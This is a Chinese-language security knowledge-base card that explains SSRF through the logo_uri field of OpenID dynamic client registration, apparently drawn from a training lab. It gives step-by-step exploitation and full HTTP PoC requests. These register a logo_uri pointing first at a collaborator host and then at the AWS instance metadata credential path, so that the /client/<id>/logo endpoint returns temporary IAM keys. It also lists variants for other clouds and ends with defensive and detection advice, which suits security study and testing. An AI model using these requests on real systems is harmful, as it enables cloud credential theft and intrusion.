---
id: web-generic-oauth-dynamic-client-registration-logo-uri-ssrf
title: OpenID 动态客户端注册 logo_uri 服务端拉取 SSRF：注册任意 logo_uri 后 /client/<id>/logo 读取云元数据凭证
type: scenario
domain: web
path: web/generic/oauth
technique: oauth-dynamic-client-registration-logo-uri-ssrf
aliases:
- OAuth 动态客户端注册 SSRF
- dynamic client registration SSRF
- logo_uri SSRF
- /reg logo_uri
- OpenID DCR 元数据读取
- /client/<id>/logo SSRF
tags:
- web
- oauth
- openid
- ssrf
- cloud-metadata
- dcr
- imds
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V281
  verified_at: '2026-11-08T05:07:16+08:00'
  notes: '已对照原文 Lab: SSRF via OpenID dynamic client registration 与图11-21核对：/.well-known/openid-configuration 暴露 registration_endpoint=/reg（图14），POST /reg 带 logo_uri Collaborator 确认服务端回连（图15-18），改为 http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/ 后 GET /client/5Ae86AFXUVxLjuY0cYO88/logo 返回含 AccessKeyId/SecretAccessKey/Token 的 JSON（图19/20），靶场 solved（图21）。卡内 PoC 与原文一致。未设 affected_versions（原文未给版本）。未执行靶场。'
---

## 一句话结论

OAuth/OpenID 服务开放动态客户端注册（DCR），且客户端注册字段 `logo_uri` 会被服务端在渲染 logo 时主动拉取；攻击者注册一个 `logo_uri=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/` 的客户端，再请求 `/client/<client_id>/logo`，服务端就把云元数据响应原样返回，泄露 IAM 临时 AccessKeyId/SecretAccessKey/Token。

## 原理

- OpenID Connect 的动态客户端注册允许客户端自行 `POST /reg` 注册，提交 `redirect_uris`、`logo_uri` 等元数据；服务端返回 `client_id`、`client_secret`、`registration_access_token`。
- 客户端 logo 的展示逻辑通常是"服务端按 `logo_uri` 去取图片再返回"——这是一个由服务端发起、URL 完全可控的 HTTP 请求，且往往没有对目标地址做私网/链路本地地址过滤。
- 攻击者把 `logo_uri` 指向云元数据服务（AWS IMDS `169.254.169.254`），`GET /client/<client_id>/logo` 触发服务端请求元数据接口；元数据返回的 JSON（含临时凭证）被 logo 接口作为响应体返回给攻击者。
- 即使 logo 接口只回显图片，也可用 OAST/Burp Collaborator 的 `logo_uri` 先确认"服务端会拉取任意 URL"（DNS/HTTP 交互），再换成元数据地址读取内容。
- 根因是 SSRF 的经典组合：用户可控 URL + 服务端发起请求 + 缺少目标地址白名单/网络隔离；DCR 只是把这个 URL 暴露成了一个标准字段。

## 触发条件

- 目标 OAuth/OpenID 服务开启动态客户端注册（`/.well-known/openid-configuration` 的 `registration_endpoint` 可访问）。
- 注册的客户端元数据（如 `logo_uri`）会被服务端主动拉取，且拉取逻辑未限制内网/链路本地地址与协议。
- 服务端运行在云环境，实例元数据服务可达（AWS/GCP/Azure/阿里云等），且未强制 IMDSv2/加固。
- 攻击者能访问 `/client/<client_id>/logo`（或存在其他回显 logo 内容的接口）。

## 利用步骤

1. `GET /.well-known/openid-configuration`，找到 `registration_endpoint`（本例为 `/reg`）。
2. `POST /reg` 注册一个客户端，`redirect_uris` 任填；第一次可把 `logo_uri` 设为 Burp Collaborator/OAST 地址，确认服务端会发起 DNS/HTTP 请求。
3. 记录响应中的 `client_id`、`client_secret`、`registration_access_token`。
4. 再次 `POST /reg`（或更新注册），把 `logo_uri` 改为 `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/`。
5. `GET /client/<client_id>/logo`，响应体即元数据 JSON；从中取 `AccessKeyId`、`SecretAccessKey`、`Token`。
6. 用临时凭证访问云 API（或提交靶场要求的 secret），完成利用。

## PoC

发现注册端点：

```http
GET /.well-known/openid-configuration HTTP/1.1
Host: oauth-server
```

响应关键字段：

```json
{
  "registration_endpoint": "https://oauth-server/reg",
  "response_types_supported": ["code"],
  "scopes_supported": ["openid", "profile", "email"]
}
```

注册带 OAST logo 的客户端：

```http
POST /reg HTTP/1.1
Host: oauth-server
Content-Type: application/json

{"redirect_uris":["https://example.com"],"logo_uri":"https://<collaborator>.oastify.com/a.png"}
```

确认回连后改为元数据地址：

```http
POST /reg HTTP/1.1
Host: oauth-server
Content-Type: application/json

{"redirect_uris":["https://example.com"],"logo_uri":"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"}
```

读取：

```http
GET /client/<client_id>/logo HTTP/1.1
Host: oauth-server
```

响应（示例）：

```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2024-05-03T04:56:33Z"
}
```

## 变体与关联

- 变体：除 `logo_uri` 外，DCR 的其他 URL 字段（`client_uri`、`policy_uri`、`tos_uri`、`jwks_uri`）也可能被服务端拉取；同理测试。
- 变体：元数据路径按云厂商替换（GCP `metadata.google.internal/computeMetadata/v1/...`、Azure `169.254.169.254/metadata/instance?...`、阿里云 `100.100.100.200/latest/meta-data/`），注意部分厂商要求特定 Header。
- 变体：若 logo 接口只缓存/转码图片，可用 OAST 确认 SSRF，再尝试对内网服务做端口/路径探测（需有回显或时间侧信道）。
- 关联：[[web-generic-ssrf-cloud-metadata]]（SSRF 读云元数据通用卡）。
- 关联：[[web-generic-ssrf-clickhouse-url-s3-hdfs-cloud-metadata]]（另一个可出网组件的元数据读取）。

## 检测与防御

- 修复：对 DCR 的所有 URL 字段做严格白名单（仅 https、仅公网、禁止 IP 字面量/私网/链路本地/元数据网段），拉取时使用独立的出站代理并禁止访问内网。
- 修复：启用云厂商的元数据加固（AWS IMDSv2 强制 token、GCP 需要 Metadata-Flavor 头、Azure 需要 Metadata: true），并将应用与元数据服务网络隔离。
- 修复：/client/<id>/logo 只返回已校验并缓存的图片，不在请求时实时拉取任意 URL；对 DCR 注册接口做鉴权/速率限制。
- 检测：DCR 日志中出现 `logo_uri`/`jwks_uri` 指向 `169.254.169.254`、`100.100.100.200`、`metadata.google.internal` 或内网 IP；服务端向链路本地地址发起 HTTP 请求；OAST 域名在 logo 字段中出现。
- 检测：云侧监控元数据服务的异常访问与临时凭证在非预期 IP 使用。
